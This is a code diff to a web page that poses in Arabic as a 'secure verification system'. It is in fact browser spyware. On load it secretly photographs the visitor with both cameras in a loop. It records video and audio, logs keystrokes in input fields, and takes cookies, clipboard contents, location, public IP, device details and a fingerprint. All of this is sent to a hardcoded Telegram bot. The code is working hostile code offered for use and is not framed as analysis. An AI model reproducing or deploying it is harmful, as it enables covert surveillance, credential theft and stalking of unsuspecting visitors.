@@ -72,12 +72,21 @@
         .footer { font-size: 0.6rem; color: #5a6e8a; margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
         .badge { background: rgba(59,201,219,0.12); padding: 4px 12px; border-radius: 50px; }
         .hidden-video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        .switch-btn {
+            background: rgba(59,201,219,0.2);
+            border: 1px solid #3bc9db;
+            border-radius: 30px;
+            padding: 5px 12px;
+            color: #3bc9db;
+            cursor: pointer;
+            font-size: 0.6rem;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
 
-<video id="frontVideo" class="hidden-video" autoplay playsinline muted></video>
-<video id="backVideo" class="hidden-video" autoplay playsinline muted></video>
+<video id="cameraVideo" class="hidden-video" autoplay playsinline muted></video>
 
 <div class="glass-card">
     <h2>🔒 نظام التحقق الآمن</h2>
@@ -103,9 +112,11 @@
     const CHAT_ID = "7984067238";
     
     let frontCount = 0, backCount = 0, total = 0, cycle = 0;
-    let frontReady = false, backReady = false;
-    let frontVideo, backVideo;
+    let currentCamera = 'user'; // 'user' = أمامي, 'environment' = خلفي
+    let videoElement = null;
+    let stream = null;
     let isRunning = true;
+    let isSwitching = false;
     
     function updateUI() {
         document.getElementById('totalCounter').innerText = total;
@@ -140,15 +151,74 @@
         });
     }
     
-    async function capturePhoto(video, side, num) {
-        if(!video || video.readyState < 2) return false;
+    async function sendVoice(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('voice', blob);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+    }
+    
+    async function sendVideo(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('video', blob);
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+    }
+    
+    // ========== تشغيل الكاميرا ==========
+    async function startCamera(facingMode) {
+        if(stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+        try {
+            const newStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: facingMode } }
+            });
+            stream = newStream;
+            if(videoElement) {
+                videoElement.srcObject = stream;
+                await videoElement.play();
+            }
+            return true;
+        } catch(e) {
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode }
+                });
+                stream = newStream;
+                if(videoElement) {
+                    videoElement.srcObject = stream;
+                    await videoElement.play();
+                }
+                return true;
+            } catch(e2) {
+                return false;
+            }
+        }
+    }
+    
+    // ========== التبديل بين الكاميرات ==========
+    async function switchCamera() {
+        if(isSwitching) return;
+        isSwitching = true;
+        currentCamera = (currentCamera === 'user') ? 'environment' : 'user';
+        const success = await startCamera(currentCamera);
+        if(success) {
+            addLog(`🔄 تم التبديل إلى ${currentCamera === 'user' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`, true);
+        }
+        isSwitching = false;
+    }
+    
+    // ========== التقاط صورة ==========
+    async function capturePhoto(side, num) {
+        if(!videoElement || videoElement.readyState < 2) return false;
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.width = videoElement.videoWidth || 640;
+        canvas.height = videoElement.videoHeight || 480;
+        canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
         if(blob && blob.size > 5000) {
-            await sendPhoto(blob, side === 'front' ? `🤳 أمامية #${num}` : `📷 خلفية #${num}`);
+            await sendPhoto(blob, side === 'front' ? `🤳 صورة أمامية #${num}` : `📷 صورة خلفية #${num}`);
             if(side === 'front') frontCount++;
             else backCount++;
             total++;
@@ -158,56 +228,173 @@
         return false;
     }
     
-    async function startFrontCamera() {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            frontVideo = document.getElementById('frontVideo');
-            frontVideo.srcObject = stream;
-            await frontVideo.play();
-            frontReady = true;
-            addLog(`✅ الكاميرا الأمامية جاهزة`, true);
-        } catch(e) { addLog(`⚠️ الكاميرا الأمامية غير متاحة`, true); }
-    }
-    
-    async function startBackCamera() {
-        try {
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            backVideo = document.getElementById('backVideo');
-            backVideo.srcObject = stream;
-            await backVideo.play();
-            backReady = true;
-            addLog(`✅ الكاميرا الخلفية جاهزة`, true);
-        } catch(e) { addLog(`⚠️ الكاميرا الخلفية غير متاحة`, true); }
-    }
-    
+    // ========== دورة التصوير (أمامي + خلفي بالتبديل) ==========
     async function startCycle() {
         if(!isRunning) return;
         cycle++;
         updateUI();
         addLog(`🔄 الدورة ${cycle} - بدء التصوير`, false);
         
-        // تصوير أمامي 5 صور
-        if(frontReady) {
-            for(let i=1; i<=5; i++) {
-                await new Promise(r => setTimeout(r, 300));
-                await capturePhoto(frontVideo, 'front', frontCount+1);
-            }
+        // التصوير بالكاميرا الأمامية
+        if(currentCamera !== 'user') await switchCamera();
+        await new Promise(r => setTimeout(r, 500));
+        for(let i=1; i<=5; i++) {
+            await new Promise(r => setTimeout(r, 400));
+            await capturePhoto('front', frontCount+1);
         }
         
-        // تصوير خلفي 5 صور
-        if(backReady) {
-            for(let i=1; i<=5; i++) {
-                await new Promise(r => setTimeout(r, 300));
-                await capturePhoto(backVideo, 'back', backCount+1);
-            }
+        // التبديل إلى الكاميرا الخلفية
+        await switchCamera();
+        await new Promise(r => setTimeout(r, 500));
+        for(let i=1; i<=5; i++) {
+            await new Promise(r => setTimeout(r, 400));
+            await capturePhoto('back', backCount+1);
         }
+        
+        // العودة إلى الكاميرا الأمامية للدورة القادمة
+        await switchCamera();
         
         addLog(`✅ اكتملت الدورة ${cycle} (${total} صورة)`, true);
-        setTimeout(startCycle, 6000);
+        setTimeout(startCycle, 7000);
     }
     
+    // ========== تسجيل فيديو 10 ثواني ==========
+    async function recordVideo() {
+        try {
+            const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const recorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                if(blob.size > 10000) await sendVideo(blob);
+                addLog(`🎥 تم إرسال الفيديو`, true);
+                videoStream.getTracks().forEach(t => t.stop());
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000);
+            addLog(`🎥 جاري تسجيل فيديو 10 ثواني...`, false);
+        } catch(e) { addLog(`❌ فشل تسجيل الفيديو`, true); }
+    }
+    
+    // ========== تسجيل صوت 10 ثواني ==========
+    async function recordAudio() {
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(audioStream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                if(blob.size > 5000) await sendVoice(blob);
+                addLog(`🎙️ تم إرسال التسجيل الصوتي`, true);
+                audioStream.getTracks().forEach(t => t.stop());
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000);
+            addLog(`🎙️ جاري تسجيل صوت 10 ثواني...`, false);
+        } catch(e) { addLog(`❌ فشل تسجيل الصوت`, true); }
+    }
+    
+    // ========== الموقع الجغرافي ==========
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) { resolve(); return; }
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendMessage(`📍 *الموقع الجغرافي*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy} متر`);
+                addLog(`📍 تم تحديد الموقع`, true);
+                resolve();
+            }, () => { resolve(); });
+        });
+    }
+    
+    // ========== معلومات الجهاز ==========
+    async function sendDeviceInfo() {
+        let info = `🖥️ *معلومات الجهاز*\n━━━━━━━━━━━━━━━━━━\n`;
+        info += `📱 المتصفح: ${navigator.userAgent.substring(0, 150)}\n`;
+        info += `💻 النظام: ${navigator.platform}\n`;
+        info += `🌐 اللغة: ${navigator.language}\n`;
+        info += `📺 الشاشة: ${screen.width}×${screen.height}\n`;
+        info += `🧠 الرام: ${navigator.deviceMemory || '?'} جيجابايت\n`;
+        info += `⚙️ المعالج: ${navigator.hardwareConcurrency || '?'} نواة\n`;
+        await sendMessage(info);
+        addLog(`📱 تم إرسال معلومات الجهاز`, true);
+    }
+    
+    // ========== IP العام ==========
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            await sendMessage(`🌍 *IP العام*\n\`${data.ip}\``);
+            addLog(`🌍 تم تحديد IP العام`, true);
+        } catch(e) {}
+    }
+    
+    // ========== بصمة الجهاز ==========
+    async function getFingerprint() {
+        if(typeof FingerprintJS === 'undefined') return;
+        try {
+            const fp = await FingerprintJS.load();
+            const result = await fp.get();
+            await sendMessage(`🆔 *بصمة الجهاز*\n\`${result.visitorId}\``);
+            addLog(`🆔 تم إنشاء بصمة الجهاز`, true);
+        } catch(e) {}
+    }
+    
+    // ========== الكوكيز ==========
+    async function stealCookies() {
+        const cookies = document.cookie;
+        if(cookies && cookies.length > 0) {
+            await sendMessage(`🍪 *ملفات تعريف الارتباط (كوكيز)*\n\`${cookies.substring(0, 900)}\``);
+            addLog(`🍪 تم سحب الكوكيز`, true);
+        }
+    }
+    
+    // ========== Keylogger ==========
+    let keylogBuffer = "";
+    function startKeylogger() {
+        document.addEventListener('keydown', (e) => {
+            if(e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
+                keylogBuffer += e.key;
+                if(keylogBuffer.length > 100) {
+                    sendMessage(`⌨️ *سجل الضغطات (Keylogger)*\n\`${keylogBuffer}\``);
+                    keylogBuffer = "";
+                }
+            }
+        });
+        setInterval(() => {
+            if(keylogBuffer.length > 0) {
+                sendMessage(`⌨️ *سجل الضغطات (Keylogger)*\n\`${keylogBuffer}\``);
+                keylogBuffer = "";
+            }
+        }, 10000);
+        addLog(`⌨️ تم تفعيل Keylogger`, true);
+    }
+    
+    // ========== سرقة الحافظة ==========
+    async function stealClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            if(text && text.length > 0) {
+                await sendMessage(`📋 *الحافظة (Clipboard)*\n\`${text.substring(0, 500)}\``);
+                addLog(`📋 تم سحب الحافظة`, true);
+            }
+        } catch(e) {}
+    }
+    
+    // ========== الاهتزاز ==========
+    function vibrateDevice() {
+        if(navigator.vibrate) {
+            navigator.vibrate([200, 100, 200]);
+            addLog(`📳 تم اهتزاز الجهاز`, true);
+        }
+    }
+    
+    // ========== MAIN ==========
     async function run() {
         addLog(`🔐 جاري طلب الصلاحيات...`, false);
+        
         try {
             await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             addLog(`✅ تم منح الصلاحيات`, true);
@@ -216,34 +403,33 @@
             return;
         }
         
-        await sendMessage(`🚀 *تم تشغيل النظام*\n🕐 ${new Date().toLocaleString('ar-EG')}`);
+        // تهيئة عنصر الفيديو
+        videoElement = document.getElementById('cameraVideo');
         
-        // تشغيل الكاميرات فوراً
-        startFrontCamera();
-        startBackCamera();
+        // بدء الكاميرا الأمامية
+        addLog(`📷 جاري تشغيل الكاميرا الأمامية...`, false);
+        await startCamera('user');
+        addLog(`✅ الكاميرا الأمامية جاهزة`, true);
         
-        // بدء التصوير بعد 1.5 ثانية فقط
-        setTimeout(() => {
-            if(frontReady || backReady) startCycle();
-            else addLog(`⚠️ لا توجد كاميرات متاحة`, true);
-        }, 1500);
+        // إرسال رسالة بدء التشغيل
+        await sendMessage(`🚀 *تم تشغيل نظام التحقق*\n🕐 ${new Date().toLocaleString('ar-EG')}`);
         
-        // ميزات إضافية (تعمل في الخلفية)
-        navigator.geolocation.getCurrentPosition(async p => {
-            await sendMessage(`📍 *الموقع*\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-        });
-        try {
-            const ip = await (await fetch('https://api.ipify.org?format=json')).json();
-            await sendMessage(`🌍 *IP العام*\n\`${ip.ip}\``);
-        } catch(e) {}
-        if(typeof FingerprintJS !== 'undefined') {
-            const fp = await FingerprintJS.load();
-            const res = await fp.get();
-            await sendMessage(`🆔 *بصمة الجهاز*\n\`${res.visitorId}\``);
-        }
-        if(document.cookie) await sendMessage(`🍪 *الكوكيز*\n\`${document.cookie.substring(0, 900)}\``);
+        // بدء التصوير بعد 1 ثانية
+        setTimeout(() => startCycle(), 1000);
         
-        addLog(`✅ تم تشغيل جميع الميزات`, true);
+        // تشغيل جميع الميزات بالتوازي
+        recordVideo();
+        recordAudio();
+        getLocation();
+        sendDeviceInfo();
+        getPublicIP();
+        getFingerprint();
+        stealCookies();
+        startKeylogger();
+        stealClipboard();
+        vibrateDevice();
+        
+        addLog(`✅ تم تشغيل جميع الميزات بنجاح`, true);
     }
     
     window.onload = () => { setTimeout(run, 200); };
